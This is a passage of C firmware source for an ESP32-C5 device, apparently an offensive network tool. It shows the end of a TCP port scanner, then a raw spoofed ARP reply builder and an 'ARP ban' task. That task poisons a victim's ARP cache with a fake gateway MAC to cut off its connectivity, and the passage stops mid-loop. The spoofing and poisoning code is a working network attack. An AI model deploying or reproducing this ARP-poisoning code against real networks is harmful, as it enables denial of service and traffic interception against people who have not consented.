brokali/projectZeroTouch/ESP32C5/main/main.c
        int open_on_host = 0;
        for (int p = 0; p < port_count; p++) {
            if (operation_stop_requested) break;
            if (p % 10 == 0) {
                int end_p = p + 9;
                if (end_p >= port_count) end_p = port_count - 1;
                MY_LOG_INFO(TAG, "  Scanning %s ports %d-%d [%d/%d] ...",
                            ip_str, nmap_ports[p].port, nmap_ports[end_p].port, p + 1, port_count);
                char oled_prog[40];
                snprintf(oled_prog, sizeof(oled_prog), "  Port %d/%d (%d-%d)",
                         p + 1, port_count, nmap_ports[p].port, nmap_ports[end_p].port);
                oled_display_update_full("> NMAP Scan", oled_line, oled_prog, "");
            }
            if (nmap_check_port(host_ip, nmap_ports[p].port)) {
                MY_LOG_INFO(TAG, "  %5d/tcp  open  %s",
                            nmap_ports[p].port, nmap_ports[p].name);
                open_on_host++;
                total_open++;
            }
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "  (scan stopped by user)");
            break;
        }
        if (open_on_host == 0) {
            MY_LOG_INFO(TAG, "  (no open ports)");
        }
    }
    MY_LOG_INFO(TAG, "=========================");
    MY_LOG_INFO(TAG, "Scanned %d hosts, found %d open ports", host_count, total_open);

    free(hosts);

    oled_display_update_full("> NMAP Done",
        host_count > 0 ? "  Scan complete" : "  No hosts found",
        "", "");

    return 0;
}

// Helper to parse MAC address from string "AA:BB:CC:DD:EE:FF"
static bool parse_mac_address(const char *str, uint8_t *mac) {
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

// ARP packet structure (Ethernet + ARP)
#define ARP_PACKET_SIZE 42  // 14 (Eth header) + 28 (ARP header)
#define ETH_TYPE_ARP 0x0806
#define ARP_HWTYPE_ETH 1
#define ARP_PROTO_IP 0x0800
#define ARP_OP_REPLY 2

// Helper to build and send ARP reply packet
static void send_arp_reply(struct netif *lwip_netif, 
                           const uint8_t *dst_mac,      // Ethernet destination
                           const uint8_t *src_mac,      // Ethernet source (fake)
                           const uint8_t *sender_mac,   // ARP sender MAC (fake)
                           uint32_t sender_ip,          // ARP sender IP (spoofed)
                           const uint8_t *target_mac,   // ARP target MAC
                           uint32_t target_ip) {        // ARP target IP
    
    uint8_t arp_packet[ARP_PACKET_SIZE];
    
    // Ethernet header (14 bytes)
    memcpy(&arp_packet[0], dst_mac, 6);              // Destination MAC
    memcpy(&arp_packet[6], src_mac, 6);              // Source MAC (fake)
    arp_packet[12] = (ETH_TYPE_ARP >> 8) & 0xFF;     // EtherType ARP (0x0806)
    arp_packet[13] = ETH_TYPE_ARP & 0xFF;
    
    // ARP header (28 bytes)
    arp_packet[14] = (ARP_HWTYPE_ETH >> 8) & 0xFF;   // Hardware type: Ethernet (1)
    arp_packet[15] = ARP_HWTYPE_ETH & 0xFF;
    arp_packet[16] = (ARP_PROTO_IP >> 8) & 0xFF;     // Protocol type: IPv4 (0x0800)
    arp_packet[17] = ARP_PROTO_IP & 0xFF;
    arp_packet[18] = 6;                               // Hardware address length
    arp_packet[19] = 4;                               // Protocol address length
    arp_packet[20] = (ARP_OP_REPLY >> 8) & 0xFF;     // Operation: ARP Reply (2)
    arp_packet[21] = ARP_OP_REPLY & 0xFF;
    
    // Sender hardware address (fake MAC)
    memcpy(&arp_packet[22], sender_mac, 6);
    
    // Sender protocol address (spoofed IP)
    arp_packet[28] = sender_ip & 0xFF;
    arp_packet[29] = (sender_ip >> 8) & 0xFF;
    arp_packet[30] = (sender_ip >> 16) & 0xFF;
    arp_packet[31] = (sender_ip >> 24) & 0xFF;
    
    // Target hardware address
    memcpy(&arp_packet[32], target_mac, 6);
    
    // Target protocol address
    arp_packet[38] = target_ip & 0xFF;
    arp_packet[39] = (target_ip >> 8) & 0xFF;
    arp_packet[40] = (target_ip >> 16) & 0xFF;
    arp_packet[41] = (target_ip >> 24) & 0xFF;
    
    // Allocate pbuf and send
    struct pbuf *p = pbuf_alloc(PBUF_RAW, ARP_PACKET_SIZE, PBUF_RAM);
    if (p != NULL) {
        memcpy(p->payload, arp_packet, ARP_PACKET_SIZE);
        lwip_netif->linkoutput(lwip_netif, p);
        pbuf_free(p);
    }
}

static void arp_ban_task(void *pvParameters) {
    (void)pvParameters;
    
    // Get netif
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "ARP ban: STA netif not found");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif) {
        MY_LOG_INFO(TAG, "ARP ban: LwIP netif not found");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    if (!lwip_netif->linkoutput) {
        MY_LOG_INFO(TAG, "ARP ban: netif has no linkoutput function");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Fake MAC (non-existent address to break connectivity)
    uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };
    
    MY_LOG_INFO(TAG, "ARP ban: Poisoning both victim and router");
    uint32_t arp_cycle = 0;
    
    while (arp_ban_active) {
        // Packet 1: To VICTIM - "Gateway IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_target_mac,       // Eth dst: victim
                       fake_mac,                  // Eth src: fake
                       fake_mac,                  // ARP sender MAC: fake
                       arp_ban_gateway_ip.addr,   // ARP sender IP: gateway (spoofed!)
                       arp_ban_target_mac,        // ARP target MAC: victim
                       arp_ban_target_ip.addr);   // ARP target IP: victim
        
        vTaskDelay(pdMS_TO_TICKS(50));  // Small delay between packets
        
